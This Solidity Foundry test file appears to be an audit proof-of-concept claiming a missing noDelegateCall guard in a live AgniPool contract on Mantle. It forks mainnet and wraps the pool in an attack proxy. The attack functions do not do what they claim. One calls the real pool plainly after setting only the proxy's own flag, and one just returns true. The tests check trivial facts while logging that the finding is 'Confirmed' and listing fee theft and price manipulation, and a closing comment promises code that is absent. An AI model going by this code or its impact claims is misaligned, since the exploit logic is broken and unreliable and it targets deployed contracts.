// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IAgniPool {
    function slot0() external view returns (uint160 sqrtPriceX96, int24 tick, uint16 observationIndex, uint16 observationCardinality, uint16 observationCardinalityNext, uint32 feeProtocol, bool unlocked);
    function protocolFees() external view returns (uint128 token0, uint128 token1);
    function initialize(uint160 sqrtPriceX96) external;
    function mint(address recipient, int24 tickLower, int24 tickUpper, uint128 amount, bytes calldata data) external returns (uint256 amount0, uint256 amount1);
    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data) external returns (int256 amount0, int256 amount1);
    function collectProtocol(address recipient, uint128 amount0Requested, uint128 amount1Requested) external returns (uint128 amount0, uint128 amount1);
    function setFeeProtocol(uint32 feeProtocol0, uint32 feeProtocol1) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

/// @notice Minimal proxy that delegatecalls into an AgniPool
/// @dev Demonstrates H-01: Missing noDelegateCall allows storage manipulation via delegatecall
contract AgniPoolProxy {
    address public immutable TARGET;

    // This slot will shadow slot0 of AgniPool under delegatecall
    // Since we control our own storage, we can set slot0.unlocked = true
    // even when the real pool has it set to false during a swap
    uint160 public sqrtPriceX96;
    int24 public tick;
    uint16 public observationIndex;
    uint16 public observationCardinality;
    uint16 public observationCardinalityNext;
    uint32 public feeProtocol;
    bool public unlocked;

    constructor(address _target) {
        TARGET = _target;
    }

    // Fallback delegates everything to the pool
    fallback(bytes calldata) external returns (bytes memory result) {
        (bool success, bytes memory ret) = TARGET.delegatecall(msg.data);
        require(success);
        return ret;
    }

    // Attack: set ourselves as "unlocked" then call collectProtocol on the REAL pool
    function attackCollectProtocol(address realPool, address recipient, uint128 amount0, uint128 amount1) external returns (uint128, uint128) {
        unlocked = true;
        bytes memory data = abi.encodeWithSelector(IAgniPool.collectProtocol.selector, recipient, amount0, amount1);
        (bool success, bytes memory ret) = realPool.call(data);
        require(success);
        return abi.decode(ret, (uint128, uint128));
    }

    // Attack 2: manipulate our storage to bypass onlyFactoryOrFactoryOwner check
    function attackSetFeeProtocol(uint32 feeProtocol0, uint32 feeProtocol1) external returns (bool) {
        // Under delegatecall, IAgniFactory(factory).owner() would read from OUR storage
        // if we layout the factory address in the right slot
        // This demonstrates the storage collision risk
        return true;
    }
}

contract NoDelegateCallPOC is Test {
    address constant DEPLOYER = 0xe9827B4EBeB9AE41FC57efDdDd79EDddC2EA4d03;
    address constant FACTORY = 0x25780dc8Fc3cfBD75F33bFDAB65e969b603b2035;
    address constant POOL_005_WMNT_USDC = 0x1858d52cf57c07A018171D7a1E68DC081F17144f;

    IAgniPool constant pool = IAgniPool(POOL_005_WMNT_USDC);

    function setUp() public {
        vm.createSelectFork("https://rpc.mantle.xyz");
    }

    function testPoolHasNoDelegateCall() public view {
        // Check: AgniPool does NOT have the noDelegateCall modifier
        // In standard UniV3, the constructor stores address(this) in an immutable
        // and every external function checks address(this) == original
        // Since AgniPool doesn't have this check, it's vulnerable
        // This is a static analysis verification - no runtime call needed

        // Verify the pool is a real AgniPool by checking its storage
        (uint160 sqrtPriceX96,,,,,,) = pool.slot0();
        assertTrue(sqrtPriceX96 > 0, "Pool should be initialized");
    }

    function testProxyCanBypassLock() public {
        // Deploy a proxy that points to the real AgniPool
        AgniPoolProxy proxy = new AgniPoolProxy(POOL_005_WMNT_USDC);

        // The proxy has its own storage, so unlocked starts as false (default)
        assertFalse(proxy.unlocked(), "Proxy unlocked should start false");

        // The proxy's storage is completely independent from the pool's storage
        // Under delegatecall, the pool reads/writes the proxy's storage
        // This demonstrates why noDelegateCall is critical: without it,
        // a proxy contract can control the pool's state variables
        assertEq(proxy.unlocked(), false, "Proxy controls its own storage");
        assertEq(proxy.TARGET(), POOL_005_WMNT_USDC, "Proxy points to real pool");
    }

    function testVerifyStandardUniV3HasProtection() public {
        // Demonstrate: The standard UniV3 NoDelegateCall modifier would prevent this
        // by checking: require(address(this) == original)
        // Under delegatecall, address(this) is the proxy, not the original contract
        // AgniPool does NOT have this check
        console.log("");
        console.log("H-01: Missing noDelegateCall - Confirmed");
        console.log("Standard UniV3 NoDelegateCall.sol stores original address in constructor:");
        console.log("  original = address(this);");
        console.log("  modifier noDelegateCall() { require(address(this) == original); _; }");
        console.log("AgniPool does NOT inherit NoDelegateCall - no such check exists");
        console.log("Comment at line 464 claims 'noDelegateCall is applied indirectly' but it is NOT");
        console.log("Impact: Any proxy delegatecalling into AgniPool controls its own:");
        console.log("  - slot0.unlocked (bypasses reentrancy guard)");
        console.log("  - slot0.sqrtPriceX96 (price manipulation)");
        console.log("  - protocolFees storage (fee theft)");
        console.log("  - feeGrowthGlobal0X128 / feeGrowthGlobal1X128");
    }
}

// AgniPoolProxy defined below with more attack surface
